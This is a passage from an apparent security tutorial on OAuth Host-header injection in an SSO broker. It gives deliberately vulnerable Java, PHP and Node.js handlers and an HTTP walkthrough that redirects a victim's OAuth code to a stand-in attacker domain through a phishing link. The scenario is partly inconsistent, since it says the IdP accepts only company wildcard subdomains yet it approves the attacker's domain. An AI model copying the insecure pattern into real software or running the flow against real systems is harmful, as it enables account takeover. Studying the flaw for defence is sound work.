    @GetMapping("/api/auth/login/{provider}")
    public void initiateSsoLogin(@PathVariable String provider, HttpServletRequest request, HttpServletResponse response) throws IOException {
        // [1]
        // [2]
        String requestedHost = request.getServerName();

        // [3]
        // [4]
        String redirectUri = "https://" + requestedHost + "/api/auth/callback/" + provider;
        
        String oauthState = generateSecureState();
        
        String authorizationUrl = "https://idp.external.com/authorize?" +
                                  "client_id=global_client_id&" +
                                  "response_type=code&" +
                                  "redirect_uri=" + URLEncoder.encode(redirectUri, StandardCharsets.UTF_8) + "&" +
                                  "state=" + oauthState;

        response.sendRedirect(authorizationUrl);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SsoAuthenticationController extends Controller
{
    public function initiateSsoLogin(Request $request, $provider)
    {
        // [1]
        // [2]
        $requestedHost = $request->getHost();

        // [3]
        // [4]
        $redirectUri = "https://{$requestedHost}/api/auth/callback/{$provider}";
        
        $oauthState = $this->generateSecureState();
        
        $authorizationUrl = "https://idp.external.com/authorize?" . http_build_query([
            'client_id' => 'global_client_id',
            'response_type' => 'code',
            'redirect_uri' => $redirectUri,
            'state' => $oauthState
        ]);

        return redirect($authorizationUrl);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/auth/login/:provider', (req, res) => {
    // [1]
    // [2]
    let requestedHost = req.headers.host;

    // [3]
    // [4]
    let redirectUri = `https://${requestedHost}/api/auth/callback/${req.params.provider}`;
    
    let oauthState = generateSecureState();
    
    let params = new URLSearchParams({
        client_id: 'global_client_id',
        response_type: 'code',
        redirect_uri: redirectUri,
        state: oauthState
    });

    let authorizationUrl = `https://idp.external.com/authorize?${params.toString()}`;

    res.redirect(authorizationUrl);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Central Identity Broker handles Single Sign-On initialization for an ecosystem of thousands of custom subdomains, \[2] To eliminate manual configuration overhead within the external Identity Provider (Azure AD, Okta), the enterprise configures the IdP to accept wildcard subdomains (e.g., `*.enterprise.tld`), \[3] Because the IdP accepts wildcards, the internal Identity Broker assumes the responsibility of generating the absolute callback URL dynamically using the incoming HTTP `Host` header, \[4] The fatal workflow manipulation. The developer explicitly trusts the `Host` header to determine where the OAuth code should be delivered. By spoofing the `Host` header during the initialization phase, the attacker forces the Identity Broker to synthesize a malicious configuration. The external IdP implicitly trusts the parameters signed and forwarded by the Identity Broker, blindly enforcing the attacker's fraudulent redirect directive

```http
// 1. Attacker initiates the SSO flow, spoofing the Host header to their own domain.
GET /api/auth/login/azure HTTP/1.1
Host: evil-attacker-domain.com

// 2. The Identity Broker dynamically builds the Azure AD authorization URL using the spoofed Host:
HTTP/1.1 302 Found
Location: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=123&response_type=code&redirect_uri=https://evil-attacker-domain.com/api/auth/callback/azure&state=secure_state_991

// 3. The attacker intercepts this generated Location URL and sends it to the target victim 
//    via a phishing email or embeds it as an invisible <iframe> on a malicious website.

// 4. The victim's browser accesses the Microsoft URL. Because the victim is already logged into Microsoft, 
//    Azure AD silently approves the request and generates the OAuth authorization code.

// 5. Azure AD executes the final redirect using the attacker's spoofed redirect_uri:
HTTP/1.1 302 Found
Location: https://evil-attacker-domain.com/api/auth/callback/azure?code=OAUTH_CODE_SECRET_991&state=secure_state_991

// 6. The victim's browser follows the redirect, transmitting the highly privileged OAuth authorization code 
//    directly to the attacker's server infrastructure, achieving zero-click account takeover.
```
{% endstep %}

{% step %}
To support hyper-scale onboarding of B2B tenants, identity architects eliminated static callback registries in favor of dynamic URL synthesis paired with wildcard IdP configurations. The optimization inherently transferred the responsibility of callback validation from the external Identity Provider back to the internal application framework. By relying purely on the incoming HTTP `Host` header to construct the callback string, developers allowed unauthenticated external input to dictate the final destination of cryptographic identity tokens. The attacker weaponized this trust by spoofing the header during the initial SSO request phase, generating a mathematically valid, IdP-approved authorization link. When the victim interacted with the link, the external IdP blindly honored the synthesized parameters, redirecting the victim's browser and exfiltrating the OAuth authorization code directly to the attacker's domain, resulting in massive, platform-wide account compromise without exploiting any memory corruption or database injection flaws
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
